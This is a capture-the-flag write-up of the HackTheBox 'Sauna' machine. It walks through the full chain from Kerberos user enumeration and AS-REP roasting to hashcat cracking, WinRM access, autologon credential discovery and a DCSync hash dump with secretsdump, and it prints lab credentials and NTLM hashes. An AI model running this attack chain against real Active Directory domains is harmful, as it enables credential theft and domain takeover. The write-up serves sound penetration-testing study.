# Sauna

# User Flag

## NMAP Enumeration

NMAP All Ports Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.175

# Output
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
80/tcp    open  http           syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
389/tcp   open  ldap           syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
3268/tcp  open  globalcatLDAP  syn-ack ttl 127
5985/tcp  open  wsman          syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49673/tcp open  unknown        syn-ack ttl 127
49674/tcp open  unknown        syn-ack ttl 127
49675/tcp open  unknown        syn-ack ttl 127
49717/tcp open  unknown        syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.175 -p 53,80,88,135,139,389,445,464,593,3268,5985,49667,49673,49674,49675,49717

# Output
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-03 17:57:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-03T17:58:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m04s
```

## Web Enumeration

Found list of potential users on website hosted on port 80:

```
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

Ran FFuF but didn't find anything.

```bash
ffuf -u http://10.10.10.175/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic

# Output
images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 59ms]
                        [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 379ms]
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 393ms]
css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 70ms]
fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 83ms]
IMAGES                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 82ms]
Fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 71ms]
CSS                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 64ms]
```

## Kerberos

Created a list of usernames pulled during the website enumeration, with different variations and enumerated users with `kerbrute` using the domain details discovered during the NMAP scans:

```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL -o /home/kali/Downloads/HackTheBox/Sauna/kerbrute-user-enum /home/kali/Downloads/HackTheBox/Sauna/userlist

# Output
2024/06/03 12:18:14 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
```

Checked for ASREPRoasting with the user `fsmith`:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.local/fsmith -dc-ip 10.10.10.175 -no-pass -request -outputfile kerberos-users-found

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d7ffd4b94758a22833dabdaaf60d440c$974908b2f080aab3477553cf0dbc3113a6c6ac7f659240b952edabc2ad71461519847f3f610f3fc120011ea43af67eac4189ba1e70717988f5a408eccde0c70461d139dfcb98339d946dffeb5ca25cdcf7464ca70eb8a2c605068af1fa9cced444f1018741384d0219732b0d691147492b99dfb932029c448aa9cf29f4aab1155e256b9577c70f8c620172d6015db48b5687a35663be85061ff1f11214329a2d870b36647fdde9fdc86f2dd622766227737d261c675b80a1f8d873c7effa04df7e9291fe7f71e20c574b84102ad6586b3cddfe8190269b6d93df456b25d9494ca09a7ba97cfc4ec93b2d0fc00ae99c19d3afed44c0375e58e6f2c68b062b372c
```

Use hashcat to crack the "Kerberos 5 AS-REP etype 23" above:

```bash
# Cracking with dictionary of password
hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt -o cracked.txt
```

New set of credentials: `fsmith:Thestrokes23`

Used `evil-winrm` since port 5985 is open to recover the user flag:

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

# Root Flag

## Windows Enumeration

Executed `winPEASx64.exe` and reviewing the output, I found autologon credentials for the user `svc_loanmanager`

```bash
Looking for AutoLogon credentials
Some AutoLogon credentials were found
DefaultDomainName             :  EGOTISTICALBANK
DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword               :  Moneymakestheworldgoround!
```

New set of credentials: `SVC_LOANMGR:Moneymakestheworldgoround!`

**N.B.** username is still `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`, despite output from winpeas.

## Bloodhound Enumeration

Ran `bloodhound-python` to enumerate AD environment:

```bash
bloodhound-python -ns 10.10.10.175 -d EGOTISTICAL-BANK.local -dc EGOTISTICAL-BANK.local -u fsmith -p Thestrokes23 -c All
```

Uploaded JSON files to bloodhound and searched for our AD account `fsmith@EGOTISTICAL-BANK.LOCAL` and `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL` in Bloodhound in the search bar. Next, I right clicked the user nodes and marked them as owned. In the Queries tab, I selected the pre-built query "Shortest Path from Owned Principals".

**N.B.** Bloodhound appears to default to the edge case CanPSRemote for both owned principles, deleted edge case to view other potential paths.

![Bloodhound](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Sauna/Images/Bloodhound.png)

Based on the output above, the user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain EGOTISTICAL-BANK.LOCAL. These two privileges allow a principal to perform a DCSync attack.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175' -just-dc

# Output
*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:e972ec702fbffbeff010695dc5eed9dd:::
......etc........
```








